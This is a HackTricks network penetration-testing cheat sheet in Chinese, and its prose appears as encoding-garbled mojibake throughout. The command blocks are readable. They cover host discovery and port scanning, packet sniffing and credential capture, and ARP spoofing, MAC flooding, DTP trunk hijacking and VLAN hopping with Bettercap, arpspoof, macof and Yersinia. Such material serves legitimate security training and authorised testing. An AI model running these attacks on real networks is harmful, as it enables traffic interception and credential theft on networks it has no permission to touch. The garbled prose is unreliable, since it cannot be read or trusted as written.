# ç½‘ç»œæ¸—é€æµ‹è¯•

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æ”»å‡»ç›´åˆ°æˆä¸ºè‹±é›„</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS çº¢é˜Ÿä¸“å®¶)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨ **HackTricksä¸Šçœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š** æˆ– **ä¸‹è½½HackTricksçš„PDFç‰ˆæœ¬**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å– [**å®˜æ–¹çš„PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç° [**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š **å…³æ³¨** æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**æ¼æ´èµé‡‘å°è´´å£«**ï¼š**æ³¨å†Œ** **Intigriti**ï¼Œä¸€ä¸ªç”±é»‘å®¢åˆ›å»ºçš„é«˜çº§**æ¼æ´èµé‡‘å¹³å°**ï¼ç«‹å³åŠ å…¥æˆ‘ä»¬ [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)ï¼Œå¼€å§‹èµšå–é«˜è¾¾ **$100,000** çš„èµé‡‘ï¼

{% embed url="https://go.intigriti.com/hacktricks" %}

## ä»å¤–éƒ¨å‘ç°ä¸»æœº

è¿™å°†æ˜¯ä¸€ä¸ª**ç®€çŸ­çš„éƒ¨åˆ†**ï¼Œå…³äºå¦‚ä½•æ‰¾åˆ°ä»**äº’è”ç½‘**å“åº”çš„**IPåœ°å€**ã€‚\
åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ‚¨æœ‰ä¸€äº›**IPèŒƒå›´**ï¼ˆç”šè‡³å¯èƒ½æ˜¯å‡ ä¸ª**èŒƒå›´**ï¼‰ï¼Œæ‚¨åªéœ€è¦æ‰¾å‡º**å“ªäº›IPåœ°å€åœ¨å“åº”**ã€‚

### ICMP

è¿™æ˜¯å‘ç°ä¸»æœºæ˜¯å¦åœ¨çº¿çš„**æœ€ç®€å•**å’Œ**æœ€å¿«**çš„æ–¹æ³•ã€‚\
æ‚¨å¯ä»¥å°è¯•å‘é€ä¸€äº›**ICMP**æ•°æ®åŒ…å¹¶**æœŸå¾…å“åº”**ã€‚æœ€ç®€å•çš„æ–¹æ³•å°±æ˜¯å‘é€ä¸€ä¸ª**å›æ˜¾è¯·æ±‚**å¹¶ç­‰å¾…å“åº”ã€‚æ‚¨å¯ä»¥ä½¿ç”¨ç®€å•çš„`ping`æˆ–ä½¿ç”¨`fping`æ¥å¤„ç†**èŒƒå›´**ã€‚\
æ‚¨è¿˜å¯ä»¥ä½¿ç”¨**nmap**å‘é€å…¶ä»–ç±»å‹çš„ICMPæ•°æ®åŒ…ï¼ˆè¿™å°†é¿å…å¯¹å¸¸è§çš„ICMPå›æ˜¾è¯·æ±‚-å“åº”çš„è¿‡æ»¤ï¼‰ã€‚
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### TCPç«¯å£å‘ç°

é€šå¸¸ä¼šå‘ç°å„ç§ICMPæ•°æ®åŒ…è¢«è¿‡æ»¤ã€‚é‚£ä¹ˆï¼Œæ£€æŸ¥ä¸»æœºæ˜¯å¦åœ¨çº¿çš„å”¯ä¸€æ–¹æ³•å°±æ˜¯**å°è¯•æ‰¾åˆ°å¼€æ”¾ç«¯å£**ã€‚æ¯ä¸ªä¸»æœºæœ‰**65535ä¸ªç«¯å£**ï¼Œæ‰€ä»¥ï¼Œå¦‚æœä½ æœ‰ä¸€ä¸ªâ€œå¤§â€çš„èŒƒå›´ï¼Œä½ **ä¸èƒ½**æµ‹è¯•æ¯ä¸ªä¸»æœºçš„**æ¯ä¸ªç«¯å£**æ˜¯å¦å¼€æ”¾ï¼Œé‚£ä¼šèŠ±è´¹å¤ªå¤šæ—¶é—´ã€‚\
å› æ­¤ï¼Œä½ éœ€è¦çš„æ˜¯ä¸€ä¸ª**å¿«é€Ÿç«¯å£æ‰«æå™¨**ï¼ˆ[masscan](https://github.com/robertdavidgraham/masscan)ï¼‰å’Œä¸€ä¸ª**æœ€å¸¸ç”¨ç«¯å£**çš„åˆ—è¡¨ï¼š
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
```markdown
ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨`nmap`æ‰§è¡Œæ­¤æ­¥éª¤ï¼Œä½†å®ƒè¾ƒæ…¢ï¼Œä¸”`nmap`åœ¨è¯†åˆ«ä¸»æœºæ˜¯å¦åœ¨çº¿æ—¶æœ‰æ—¶ä¼šé‡åˆ°é—®é¢˜ã€‚

### HTTPç«¯å£å‘ç°

è¿™åªæ˜¯ä¸€ä¸ªTCPç«¯å£å‘ç°ï¼Œå½“ä½ æƒ³è¦**ä¸“æ³¨äºå‘ç°HTTP** **æœåŠ¡**æ—¶å¾ˆæœ‰ç”¨ï¼š
```
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### UDP ç«¯å£å‘ç°

æ‚¨ä¹Ÿå¯ä»¥å°è¯•æ£€æŸ¥ä¸€äº›**UDPç«¯å£æ˜¯å¦å¼€æ”¾**ï¼Œä»¥å†³å®šæ˜¯å¦åº”è¯¥**æ›´åŠ å…³æ³¨**æŸä¸ª**ä¸»æœº**ã€‚ç”±äºUDPæœåŠ¡é€šå¸¸ä¸ä¼šå¯¹å¸¸è§„ç©ºçš„UDPæ¢æµ‹åŒ…**å“åº”ä»»ä½•æ•°æ®**ï¼Œå› æ­¤å¾ˆéš¾åˆ¤æ–­ç«¯å£æ˜¯è¢«è¿‡æ»¤è¿˜æ˜¯å¼€æ”¾çš„ã€‚å†³å®šè¿™ä¸€ç‚¹çš„æœ€ç®€å•æ–¹æ³•æ˜¯å‘é€ä¸€ä¸ªä¸æ­£åœ¨è¿è¡Œçš„æœåŠ¡ç›¸å…³çš„æ•°æ®åŒ…ï¼Œç”±äºæ‚¨ä¸çŸ¥é“æ­£åœ¨è¿è¡Œå“ªç§æœåŠ¡ï¼Œæ‚¨åº”è¯¥å°è¯•åŸºäºç«¯å£å·çš„æœ€å¯èƒ½çš„æœåŠ¡ï¼š
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
ä»¥ä¸‹æ˜¯ä¹‹å‰æå‡ºçš„nmapå‘½ä»¤è¡Œï¼Œå®ƒå°†æµ‹è¯•**/24**èŒƒå›´å†…æ¯ä¸ªä¸»æœºçš„**å‰1000ä¸ªUDPç«¯å£**ï¼Œå³ä½¿åªæ˜¯è¿™æ ·ä¹Ÿå°†èŠ±è´¹**>20åˆ†é’Ÿ**ã€‚å¦‚æœéœ€è¦**æ›´å¿«çš„ç»“æœ**ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨[**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner)ï¼š`./udp-proto-scanner.pl 199.66.11.53/24` è¿™å°†å‘å®ƒä»¬çš„**é¢„æœŸç«¯å£**å‘é€è¿™äº›**UDPæ¢é’ˆ**ï¼ˆå¯¹äº/24èŒƒå›´ï¼Œè¿™åªéœ€1åˆ†é’Ÿï¼‰ï¼š_DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike,ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### SCTPç«¯å£å‘ç°
```bash
#Probably useless, but it's pretty fast, why not trying?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## Wifiæ¸—é€æµ‹è¯•

åœ¨è¿™é‡Œï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°æˆªè‡³æ’°å†™æ—¶æ‰€æœ‰å·²çŸ¥Wifiæ”»å‡»çš„ç²¾å½©æŒ‡å—ï¼š

{% content-ref url="../pentesting-wifi/" %}
[pentesting-wifi](../pentesting-wifi/)
{% endcontent-ref %}

## ä»å†…éƒ¨å‘ç°ä¸»æœº

å¦‚æœæ‚¨åœ¨ç½‘ç»œå†…éƒ¨ï¼Œæ‚¨é¦–å…ˆæƒ³è¦åšçš„äº‹æƒ…ä¹‹ä¸€å°±æ˜¯**å‘ç°å…¶ä»–ä¸»æœº**ã€‚æ ¹æ®æ‚¨å¯ä»¥/æƒ³è¦åˆ¶é€ çš„**å™ªéŸ³é‡**ï¼Œå¯ä»¥æ‰§è¡Œä¸åŒçš„æ“ä½œï¼š

### è¢«åŠ¨

æ‚¨å¯ä»¥ä½¿ç”¨è¿™äº›å·¥å…·åœ¨è¿æ¥çš„ç½‘ç»œå†…è¢«åŠ¨å‘ç°ä¸»æœºï¼š
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### ä¸»åŠ¨

è¯·æ³¨æ„ï¼Œåœ¨[_**ä»å¤–éƒ¨å‘ç°ä¸»æœº**_](./#discovering-hosts-from-the-outside)ï¼ˆ_TCP/HTTP/UDP/SCTP ç«¯å£å‘ç°_ï¼‰ä¸­è¯„è®ºçš„æŠ€æœ¯ä¹Ÿå¯ä»¥åœ¨**è¿™é‡Œåº”ç”¨**ã€‚\
ä½†æ˜¯ï¼Œç”±äºæ‚¨ä¸å…¶ä»–ä¸»æœºå¤„äº**åŒä¸€ç½‘ç»œ**ä¸­ï¼Œæ‚¨å¯ä»¥åš**æ›´å¤šäº‹æƒ…**ï¼š
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### ä¸»åŠ¨ICMP

è¯·æ³¨æ„ï¼Œåœ¨_[_**ICMP**_](./#icmp)ä¸­è¯„è®ºçš„æŠ€æœ¯ä¹Ÿå¯ä»¥åœ¨è¿™é‡Œ**åº”ç”¨**ã€‚\
ä½†æ˜¯ï¼Œç”±äºæ‚¨ä¸å…¶ä»–ä¸»æœºåœ¨**åŒä¸€ç½‘ç»œ**ä¸­ï¼Œæ‚¨å¯ä»¥åš**æ›´å¤šäº‹æƒ…**ï¼š

* å¦‚æœæ‚¨**ping**ä¸€ä¸ª**å­ç½‘å¹¿æ’­åœ°å€**ï¼Œpingåº”è¯¥ä¼šåˆ°è¾¾**æ¯ä¸ªä¸»æœº**ï¼Œä»–ä»¬å¯èƒ½ä¼š**å›åº”**æ‚¨ï¼š`ping -b 10.10.5.255`
* Ping**ç½‘ç»œå¹¿æ’­åœ°å€**ï¼Œæ‚¨ç”šè‡³å¯ä»¥æ‰¾åˆ°ä½äº**å…¶ä»–å­ç½‘**å†…çš„ä¸»æœºï¼š`ping -b 255.255.255.255`
* ä½¿ç”¨`nmap`çš„`-PE`ã€`-PP`ã€`-PM`æ ‡å¿—æ¥æ‰§è¡Œä¸»æœºå‘ç°ï¼Œåˆ†åˆ«å‘é€**ICMPv4å›å£°**ã€**æ—¶é—´æˆ³**å’Œ**å­ç½‘æ©ç è¯·æ±‚**ï¼š`nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **ç½‘ç»œå”¤é†’**

ç½‘ç»œå”¤é†’ç”¨äºé€šè¿‡**ç½‘ç»œæ¶ˆæ¯**æ¥**æ‰“å¼€**è®¡ç®—æœºã€‚ç”¨äºæ‰“å¼€è®¡ç®—æœºçš„é­”æœ¯åŒ…åªæ˜¯ä¸€ä¸ªæä¾›äº†**MAC Dst**çš„æ•°æ®åŒ…ï¼Œç„¶ååœ¨åŒä¸€ä¸ªæ•°æ®åŒ…å†…**é‡å¤16æ¬¡**ã€‚\
ç„¶åè¿™ç§æ•°æ®åŒ…é€šå¸¸åœ¨**ä»¥å¤ªç½‘0x0842**æˆ–**UDPæ•°æ®åŒ…å‘é€åˆ°ç«¯å£9**ä¸­å‘é€ã€‚\
å¦‚æœæ²¡æœ‰æä¾›**\[MAC]**ï¼Œæ•°æ®åŒ…å°†å‘é€åˆ°**å¹¿æ’­ä»¥å¤ªç½‘**ï¼ˆå¹¶ä¸”å¹¿æ’­MACå°†æ˜¯è¢«é‡å¤çš„é‚£ä¸ªï¼‰ã€‚
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0847
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## æ‰«æä¸»æœº

ä¸€æ—¦æ‚¨å‘ç°äº†æ‰€æœ‰æƒ³è¦æ·±å…¥æ‰«æçš„IPï¼ˆå¤–éƒ¨æˆ–å†…éƒ¨ï¼‰ï¼Œå¯ä»¥æ‰§è¡Œä¸åŒçš„æ“ä½œã€‚

### TCP

* **å¼€æ”¾**ç«¯å£ï¼š_SYN --> SYN/ACK --> RST_
* **å…³é—­**ç«¯å£ï¼š_SYN --> RST/ACK_
* **è¿‡æ»¤**ç«¯å£ï¼š_SYN --> \[æ— å“åº”]_
* **è¿‡æ»¤**ç«¯å£ï¼š_SYN --> ICMPæ¶ˆæ¯_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

æ‰«æUDPç«¯å£æœ‰ä¸¤ç§é€‰æ‹©ï¼š

* å‘é€**UDPæ•°æ®åŒ…**å¹¶æ£€æŸ¥å“åº” _**ICMPä¸å¯è¾¾**_ï¼Œå¦‚æœç«¯å£æ˜¯**å…³é—­**çš„ï¼ˆåœ¨å¤šæ•°æƒ…å†µä¸‹ï¼ŒICMPä¼šè¢«**è¿‡æ»¤**ï¼Œæ‰€ä»¥å¦‚æœç«¯å£å…³é—­æˆ–æ‰“å¼€ï¼Œä½ å°†ä¸ä¼šæ”¶åˆ°ä»»ä½•ä¿¡æ¯ï¼‰ã€‚
* å‘é€**æ ¼å¼åŒ–çš„æ•°æ®æŠ¥**ä»¥å¼•èµ·**æœåŠ¡**çš„å“åº”ï¼ˆä¾‹å¦‚ï¼ŒDNSã€DHCPã€TFTPç­‰ï¼Œå¦‚_nmap-payloads_ä¸­æ‰€åˆ—ï¼‰ã€‚å¦‚æœä½ æ”¶åˆ°äº†**å“åº”**ï¼Œé‚£ä¹ˆï¼Œç«¯å£æ˜¯**å¼€æ”¾**çš„ã€‚

**Nmap**å°†ä½¿ç”¨"-sV"**æ··åˆä½¿ç”¨ä¸¤ç§**é€‰é¡¹ï¼ˆUDPæ‰«æéå¸¸æ…¢ï¼‰ï¼Œä½†è¯·æ³¨æ„ï¼ŒUDPæ‰«ææ¯”TCPæ‰«ææ…¢ï¼š
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### SCTP æ‰«æ

SCTP ä¸ TCP å’Œ UDP å¹¶åˆ—ã€‚æ—¨åœ¨é€šè¿‡ **IP** æä¾›**ç”µè¯**æ•°æ®çš„**ä¼ è¾“**ï¼Œè¯¥åè®®å¤åˆ¶äº†ä¿¡ä»¤ç³»ç»Ÿ 7 (SS7) çš„è®¸å¤šå¯é æ€§ç‰¹æ€§ï¼Œå¹¶æ”¯æ’‘ç€ä¸€ä¸ªæ›´å¤§çš„åè®®å®¶æ—ï¼Œç§°ä¸º SIGTRANã€‚SCTP å¾—åˆ°åŒ…æ‹¬ IBM AIXã€Oracle Solarisã€HP-UXã€Linuxã€Cisco IOS å’Œ VxWorks åœ¨å†…çš„æ“ä½œç³»ç»Ÿæ”¯æŒã€‚

nmap æä¾›äº†ä¸¤ç§ä¸åŒçš„ SCTP æ‰«æï¼š_-sY_ å’Œ _-sZ_
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### IDS å’Œ IPS ç»•è¿‡

{% content-ref url="ids-evasion.md" %}
[ids-evasion.md](ids-evasion.md)
{% endcontent-ref %}

### **æ›´å¤š nmap é€‰é¡¹**

{% content-ref url="nmap-summary-esp.md" %}
[nmap-summary-esp.md](nmap-summary-esp.md)
{% endcontent-ref %}

### æ­ç¤ºå†…éƒ¨ IP åœ°å€

é…ç½®é”™è¯¯çš„è·¯ç”±å™¨ã€é˜²ç«å¢™å’Œç½‘ç»œè®¾å¤‡æœ‰æ—¶ä¼š**å“åº”**ç½‘ç»œæ¢æµ‹ï¼Œ**ä½¿ç”¨éå…¬å…±æºåœ°å€**ã€‚æ‚¨å¯ä»¥ä½¿ç”¨ _tcpdump_ æ¥**è¯†åˆ«**åœ¨æµ‹è¯•æœŸé—´ä»**ç§æœ‰åœ°å€**æ”¶åˆ°çš„**æ•°æ®åŒ…**ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒKali Linux ä¸­çš„ _eth2_ æ¥å£å¯ä»¥ä»**å…¬å…±äº’è”ç½‘**è¿›è¡Œ**å¯»å€**ï¼ˆå¦‚æœæ‚¨ä½äº**NAT**æˆ–**é˜²ç«å¢™**çš„**åé¢**ï¼Œè¿™ç±»æ•°æ®åŒ…å¯èƒ½ä¼šè¢«**è¿‡æ»¤**ï¼‰ã€‚
```bash
tcpdump â€“nt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## å—…æ¢

é€šè¿‡å—…æ¢ï¼Œä½ å¯ä»¥é€šè¿‡å®¡æŸ¥æ•è·çš„å¸§å’Œæ•°æ®åŒ…æ¥äº†è§£IPèŒƒå›´ã€å­ç½‘å¤§å°ã€MACåœ°å€å’Œä¸»æœºåçš„è¯¦ç»†ä¿¡æ¯ã€‚å¦‚æœç½‘ç»œé…ç½®é”™è¯¯æˆ–äº¤æ¢ç»“æ„æ‰¿å—å‹åŠ›ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡è¢«åŠ¨ç½‘ç»œå—…æ¢æ•è·æ•æ„Ÿææ–™ã€‚

å¦‚æœäº¤æ¢å¼ä»¥å¤ªç½‘ç½‘ç»œé…ç½®æ­£ç¡®ï¼Œä½ åªä¼šçœ‹åˆ°å¹¿æ’­å¸§å’Œå‘é€åˆ°ä½ çš„MACåœ°å€çš„ææ–™ã€‚

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
ä¸€ä¸ªäººä¹Ÿå¯ä»¥é€šè¿‡SSHä¼šè¯å®æ—¶ä½¿ç”¨Wiresharkä½œä¸ºGUIä»è¿œç¨‹æœºå™¨æ•è·æ•°æ®åŒ…ã€‚
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

æ˜¾ç„¶ã€‚

### æ•è·å‡­è¯

æ‚¨å¯ä»¥ä½¿ç”¨åƒ [https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz) è¿™æ ·çš„å·¥å…·ä» pcap æ–‡ä»¶æˆ–å®æ—¶æ¥å£è§£æå‡­è¯ã€‚

## å±€åŸŸç½‘æ”»å‡»

### ARPæ¬ºéª—

ARPæ¬ºéª—åŒ…æ‹¬å‘é€æ— è¯·æ±‚çš„ARPå“åº”ï¼Œä»¥æŒ‡ç¤ºæŸå°æœºå™¨çš„IPå…·æœ‰æˆ‘ä»¬è®¾å¤‡çš„MACåœ°å€ã€‚ç„¶åï¼Œå—å®³è€…å°†æ›´æ”¹ARPè¡¨ï¼Œå¹¶ä¸”æ¯æ¬¡æƒ³è¦è”ç³»è¢«æ¬ºéª—çš„IPæ—¶ï¼Œéƒ½ä¼šè”ç³»æˆ‘ä»¬çš„æœºå™¨ã€‚

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **Arpspoof**
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### MAC Flooding - CAM overflow

é€šè¿‡å‘é€è®¸å¤šå…·æœ‰ä¸åŒæº MAC åœ°å€çš„æ•°æ®åŒ…ï¼Œä½¿äº¤æ¢æœºçš„ CAM è¡¨æº¢å‡ºã€‚å½“ CAM è¡¨æ»¡äº†ä¹‹åï¼Œäº¤æ¢æœºå¼€å§‹åƒé›†çº¿å™¨ä¸€æ ·å·¥ä½œï¼ˆå¹¿æ’­æ‰€æœ‰æµé‡ï¼‰ã€‚
```bash
macof -i <interface>
```
åœ¨ç°ä»£äº¤æ¢æœºä¸­ï¼Œè¿™ä¸ªæ¼æ´å·²ç»è¢«ä¿®å¤ã€‚

### 802.1Q VLAN / DTP æ”»å‡»

#### åŠ¨æ€æ±‡èš

**DTPï¼ˆåŠ¨æ€æ±‡èšåè®®ï¼‰** æ˜¯ä¸€ç§é“¾è·¯å±‚åè®®ï¼Œæ—¨åœ¨æä¾›è‡ªåŠ¨æ±‡èšç³»ç»Ÿã€‚ä½¿ç”¨ DTPï¼Œäº¤æ¢æœºå†³å®šå“ªä¸ªç«¯å£å°†ä»¥æ±‡èšæ¨¡å¼ï¼ˆTrunkï¼‰å·¥ä½œï¼Œå“ªä¸ªä¸ä¼šã€‚ä½¿ç”¨ **DTP** è¡¨æ˜ **ç½‘ç»œè®¾è®¡ä¸ä½³ã€‚** **æ±‡èšåº”è¯¥ä¸¥æ ¼åœ°** åœ¨éœ€è¦çš„åœ°æ–¹ä½¿ç”¨ï¼Œå¹¶ä¸”åº”è¯¥æœ‰æ–‡æ¡£è®°å½•ã€‚

**é»˜è®¤æƒ…å†µä¸‹ï¼Œæ‰€æœ‰äº¤æ¢æœºç«¯å£éƒ½ä»¥åŠ¨æ€è‡ªåŠ¨æ¨¡å¼è¿è¡Œã€‚** è¿™è¡¨æ˜äº¤æ¢æœºç«¯å£å¤„äºæ¥è‡ªé‚»è¿‘äº¤æ¢æœºçš„æ±‡èšå‘èµ·æ¨¡å¼ã€‚**æ¸—é€æµ‹è¯•äººå‘˜éœ€è¦ç‰©ç†è¿æ¥åˆ°äº¤æ¢æœºå¹¶å‘é€ DTP Desirable å¸§**ï¼Œè¿™ä¼šè§¦å‘ç«¯å£åˆ‡æ¢åˆ°æ±‡èšæ¨¡å¼ã€‚æ”»å‡»è€…éšåå¯ä»¥ä½¿ç”¨ STP å¸§åˆ†ææ¥æšä¸¾ VLANï¼Œå¹¶é€šè¿‡åˆ›å»ºè™šæ‹Ÿæ¥å£ç»•è¿‡ VLAN åˆ†æ®µã€‚

è®¸å¤šäº¤æ¢æœºé»˜è®¤æ”¯æŒåŠ¨æ€æ±‡èšåè®®ï¼ˆDTPï¼‰ï¼Œç„¶è€Œï¼Œæ•Œæ‰‹å¯ä»¥æ»¥ç”¨å®ƒæ¥**æ¨¡æ‹Ÿäº¤æ¢æœºå¹¶æ¥æ”¶è·¨æ‰€æœ‰ VLAN çš„æµé‡**ã€‚å·¥å…· [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) å¯ä»¥å—…æ¢æ¥å£å¹¶**æŠ¥å‘Šäº¤æ¢æœºæ˜¯å¦å¤„äºé»˜è®¤æ¨¡å¼ã€æ±‡èšã€åŠ¨æ€ã€è‡ªåŠ¨æˆ–æ¥å…¥æ¨¡å¼**ï¼ˆè¿™æ˜¯å”¯ä¸€å¯ä»¥é¿å… VLAN è·³è·ƒçš„æ¨¡å¼ï¼‰ã€‚è¯¥å·¥å…·å°†æŒ‡ç¤ºäº¤æ¢æœºæ˜¯å¦æ˜“å—æ”»å‡»ã€‚

å¦‚æœå‘ç°ç½‘ç»œæ˜“å—æ”»å‡»ï¼Œä½ å¯ä»¥ä½¿ç”¨ _**Yersinia**_ å‘èµ· "**å¯ç”¨æ±‡èš**" ä½¿ç”¨åè®® "**DTP**"ï¼Œä½ å°†èƒ½å¤Ÿçœ‹åˆ°æ‰€æœ‰ VLAN çš„ç½‘ç»œæ•°æ®åŒ…ã€‚
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../.gitbook/assets/image (646) (1).png>)

è¦æšä¸¾VLANsï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨è„šæœ¬ [**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py) ç”ŸæˆDTP Desirableå¸§ã€‚**åœ¨ä»»ä½•æƒ…å†µä¸‹éƒ½ä¸è¦ä¸­æ–­è„šæœ¬ã€‚**å®ƒæ¯ä¸‰ç§’æ³¨å…¥ä¸€æ¬¡DTP Desirableã€‚**äº¤æ¢æœºä¸ŠåŠ¨æ€åˆ›å»ºçš„å¹²é“é€šé“ä»…å­˜æ´»äº”åˆ†é’Ÿã€‚äº”åˆ†é’Ÿåï¼Œå¹²é“ä¼šæ–­å¼€ã€‚**
```
sudo python3 DTPHijacking.py --interface eth0
```
#### æ”»å‡»ç‰¹å®šçš„VLAN

ä¸€æ—¦ä½ çŸ¥é“äº†VLAN IDå’ŒIPå€¼ï¼Œä½ å¯ä»¥**é…ç½®ä¸€ä¸ªè™šæ‹Ÿæ¥å£æ¥æ”»å‡»ç‰¹å®šçš„VLAN**ã€‚\
å¦‚æœæ²¡æœ‰DHCPï¼Œé‚£ä¹ˆä½¿ç”¨_ifconfig_æ¥è®¾ç½®é™æ€IPåœ°å€ã€‚
```
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
